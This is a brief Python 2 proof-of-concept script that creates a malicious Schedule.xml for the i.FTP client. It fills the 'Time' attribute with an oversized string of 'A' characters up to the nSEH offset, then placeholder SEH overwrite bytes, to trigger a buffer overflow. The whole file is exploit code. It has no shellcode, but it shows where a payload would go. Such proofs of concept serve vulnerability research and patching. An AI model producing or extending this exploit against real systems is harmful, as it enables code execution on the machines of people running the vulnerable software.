# the field "Time" in Schedule.xml may cause a buffer overflow to i.FTP

url = "http://example.org"
folder = "somefolder"

time = "A" * 600  # offset of the nSEH
time += "BBBB"
time += "CCCC"

exploit = '<?xml version="1.0" encoding="UTF-8" ?>' + \
'<Schedule>' + \
	'<Event Url="{url}" Time="{time}" Folder="{folder}" />' + \
'</Schedule>'

exploit = exploit.format(**locals())

print exploit

filename = "Schedule.xml"
file = open(filename , "w")
file.write(exploit)
print "\n[*]Created Schedule.xml"

file.close()